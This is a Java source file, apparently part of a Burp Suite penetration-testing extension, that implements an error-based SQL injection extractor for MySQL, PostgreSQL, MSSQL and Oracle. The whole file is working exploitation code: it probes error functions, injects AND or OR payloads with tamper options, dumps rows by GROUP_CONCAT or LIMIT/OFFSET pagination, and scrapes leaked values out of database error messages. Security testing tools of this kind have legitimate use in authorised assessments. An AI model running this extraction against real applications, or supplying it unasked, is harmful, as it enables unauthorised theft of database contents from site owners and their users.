package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.dbms.MysqlDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Error-based SQL injection extractor for OmniMap.
 * Injects queries that cause the DBMS to leak data inside error messages.
 *
 * DBMS-specific error functions:
 * - MySQL: extractvalue(), updatexml(), floor(rand()) double-query
 * - PostgreSQL: CAST type conversion error
 * - MSSQL: CONVERT/CAST conversion error
 * - Oracle: UTL_INADDR, CTXSYS.DRITHSX.SN, TO_NUMBER
 * - SQLite: not applicable (no useful error-based extraction)
 */
public class ErrorExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private volatile boolean cancelled = false;

    /** The error function template that works (detected during probe phase) */
    private String workingErrorFunction = null;

    /** The conjunction operator that works (AND or OR) */
    private String workingOperator = "AND";

    /** Decoded marker strings for MySQL random hex markers */
    private String markerPrefix = null;
    private String markerSuffix = null;

    /** Static fallback patterns for non-MySQL DBMS */
    private static final List<Pattern> STATIC_EXTRACTION_PATTERNS = List.of(
            // PostgreSQL/MSSQL: invalid input syntax for integer: "DATA"
            Pattern.compile("(?:invalid input syntax for (?:type )?integer|nvarchar value '|Conversion failed)[^\"']*[\"']([^\"']+)[\"']"),
            // MSSQL convert: when converting the nvarchar value 'DATA'
            Pattern.compile("converting the \\w+ value '([^']+)'"),
            // Oracle UTL_INADDR: ORA-29257: host DATA unknown
            Pattern.compile("ORA-\\d+:[^\"']*?([\\w@._-]+)")
    );

    public ErrorExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                          OmniMapCallback callback, OmniMapResult result,
                          HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;

        // Extract random hex markers from MySQL dialect for pattern matching
        if (dialect instanceof MysqlDialect mysqlDialect) {
            this.markerPrefix = mysqlDialect.getErrorPrefixDecoded();
            this.markerSuffix = mysqlDialect.getErrorSuffixDecoded();
        }
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Probe to find a working error function.
     * Level controls which error functions are tried (more exotic at higher levels).
     * Risk 3 adds OR-based error payloads.
     *
     * Level 1: Primary error functions (extractvalue, CAST, CONVERT, UTL_INADDR)
     * Level 2+: Additional functions (GTID_SUBSET, CAST NUMERIC, XMLType)
     * Level 3+: More exotic functions (JSON_KEYS, UPDATEXML, DBMS_UTILITY)
     * Level 4+: Overflow-based (BIGINT, EXP)
     *
     * Risk 1-2: AND-based error payloads
     * Risk 3: Also tries OR-based error payloads
     *
     * @return true if error-based extraction is viable
     */
    public boolean detect() {
        List<String> errorFunctions = dialect.errorFunctionsForLevel(config.getLevel());
        if (errorFunctions.isEmpty()) {
            callback.onProgress("ERROR: No error functions for " + dialect.getName(), 0);
            return false;
        }

        callback.onProgress("ERROR: Probing " + errorFunctions.size() + " error functions (level " +
                config.getLevel() + ", risk " + config.getRisk() + ")...", 5);

        // Build list of conjunction operators to try: AND always, OR at risk 3
        List<String> operators = new ArrayList<>();
        operators.add("AND");
        if (config.getRisk() >= 3) {
            operators.add("OR");
        }

        // Test each error function with a known query (current database)
        String testQuery = dialect.currentDatabase();

        for (String operator : operators) {
            for (String funcTemplate : errorFunctions) {
                if (cancelled) return false;

                String errorPayload = String.format(funcTemplate, testQuery);
                String payload = " " + operator + " " + errorPayload + " ";
                payload = TamperEngine.apply(payload, config.getTampers());

                var response = sendPayload(payload);
                if (response == null) continue;

                String body = response.bodyToString();
                if (body == null) continue;

                // Try to extract data from the error message
                String extracted = extractFromError(body);
                if (extracted != null && !extracted.isEmpty()) {
                    workingErrorFunction = funcTemplate;
                    workingOperator = operator;
                    callback.onProgress("ERROR: Working function found â€” " + operator + " " +
                            funcTemplate.split("\\(")[0], 10);
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * Extract a single value using error-based injection.
     * Uses the operator (AND/OR) that was detected as working.
     */
    public String extractSingle(String query) {
        if (cancelled || workingErrorFunction == null) return null;

        String errorPayload = String.format(workingErrorFunction, query);
        String payload = " " + workingOperator + " " + errorPayload + " ";
        payload = TamperEngine.apply(payload, config.getTampers());

        var response = sendPayload(payload);
        if (response == null) return null;

        String body = response.bodyToString();
        return extractFromError(body);
    }

    /**
     * Extract a list of values using error-based injection.
     * For each row, uses LIMIT/OFFSET pagination.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        // MySQL optimization: try GROUP_CONCAT first
        if ("MySQL".equals(dialect.getName())) {
            String grouped = extractSingle("SELECT GROUP_CONCAT(" +
                    query.replaceFirst("(?i)SELECT\\s+", "") + " SEPARATOR 0x7c)");
            if (grouped != null && !grouped.isEmpty()) {
                for (String val : grouped.split("\\|")) {
                    String trimmed = val.trim();
                    if (!trimmed.isEmpty()) results.add(trimmed);
                }
                if (!results.isEmpty()) return results;
            }
        }

        // Row-by-row extraction using dialect-aware pagination
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            results.add(val.trim());
        }

        return results;
    }

    /**
     * Extract data from an error message.
     * For MySQL: uses the random hex markers (like sqlmap's kb.chars.start/stop).
     * For other DBMS: uses static regex patterns.
     */
    private String extractFromError(String body) {
        if (body == null) return null;

        // MySQL: extract data between the random hex markers
        if (markerPrefix != null && markerSuffix != null) {
            int start = body.indexOf(markerPrefix);
            if (start >= 0) {
                start += markerPrefix.length();
                int end = body.indexOf(markerSuffix, start);
                if (end > start) {
                    String data = body.substring(start, end).trim();
                    if (!data.isEmpty() && data.length() < 500) return data;
                }
                // floor() variant: data appears before suffix with trailing digit
                // Pattern: markerSuffix + "1" in "Duplicate entry 'DATAsuffix1'"
                String remaining = body.substring(start);
                int suffixPos = remaining.indexOf(markerSuffix);
                if (suffixPos > 0) {
                    String data = remaining.substring(0, suffixPos).trim();
                    if (!data.isEmpty() && data.length() < 500) return data;
                }
            }
        }

        // Fallback: static regex patterns for non-MySQL DBMS
        for (Pattern pattern : STATIC_EXTRACTION_PATTERNS) {
            Matcher m = pattern.matcher(body);
            if (m.find() && m.groupCount() > 0) {
                String data = m.group(1).trim();
                if (!data.isEmpty() && data.length() < 500) {
                    return data;
                }
            }
        }

        return null;
    }

    /**
     * Send a request with the payload injected.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), config.getPrefix() + payload +
                            (config.getSuffix().isEmpty() ? "" : config.getSuffix()));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "ERROR", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }
}
